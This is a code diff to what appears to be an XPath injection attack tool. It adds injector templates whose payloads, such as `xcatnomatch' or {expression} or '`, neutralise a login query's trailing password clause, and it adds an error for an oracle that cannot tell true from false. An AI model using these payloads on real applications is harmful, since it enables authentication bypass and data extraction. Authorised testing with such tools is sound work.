@@ -4,7 +4,15 @@ from xpath import E
 
 import click
 
-from xcat.attack import AttackContext, Injection, check, timed_request
+from xcat.attack import AttackContext, Injection, check, timed_request, OracleNotDifferentialError
+
+# A token chosen to be extremely unlikely to equal any real node value. The
+# OR-based injectors inject `DUMMY' or ... or '` so the left-hand
+# `field='DUMMY'` comparison is always false. This guarantees the injected
+# expression — not the working value — controls the predicate, even if the
+# operator passes a real/valid value, and the trailing `or '` swallows any
+# remaining ANDed clause (e.g. `and password=...`) into a dead branch.
+OR_DUMMY = 'xcatnomatch'
 
 injectors = [
     Injection('integer',
@@ -42,6 +50,20 @@ injectors = [
                   ('{working}" or false() and "1"="1', False),
               ),
               '{working}" or {expression} and "1"="1'),
+    Injection('string - single quote - double-or',
+              "/lib/book[name='?' and pass='...'] (trailing-clause safe; isolates a dummy)",
+              (
+                  (OR_DUMMY + "' or true() or '", True),
+                  (OR_DUMMY + "' or false() or '", False),
+              ),
+              OR_DUMMY + "' or {expression} or '"),
+    Injection('string - double quote - double-or',
+              '/lib/book[name="?" and pass="..."] (trailing-clause safe; isolates a dummy)',
+              (
+                  (OR_DUMMY + '" or true() or "', True),
+                  (OR_DUMMY + '" or false() or "', False),
+              ),
+              OR_DUMMY + '" or {expression} or "'),
     Injection('attribute name - prefix',
               "/lib/book[?=value]",
               (
@@ -99,6 +121,7 @@ async def detect_injections(context: 'AttackContext') -> list[Injection]:
     working_value = context.target_parameter_value
 
     returner = []
+    all_results: list[bool] = []
 
     for injector in injectors:
         payloads = injector.test_payloads(working_value)
@@ -108,9 +131,19 @@ async def detect_injections(context: 'AttackContext') -> list[Injection]:
         ]
 
         results = await asyncio.gather(*result_futures)
+        all_results.extend(results)
 
         if all(result == expected for result, (_, expected) in zip(results, payloads)):
             returner.append(injector)
+
+    # No injector matched. If the oracle returned the *same* answer for every
+    # single probe it never differentiated true from false — that is a
+    # misconfigured/saturated oracle, not (necessarily) a non-vulnerable target.
+    # Surface that distinctly so the operator fixes the oracle instead of
+    # assuming the target is safe. A *mixed* set of results means the oracle
+    # works but no template fit, which stays the generic "no injections" case.
+    if not returner and all_results and len(set(all_results)) == 1:
+        raise OracleNotDifferentialError(all_results[0])
 
     return returner
 
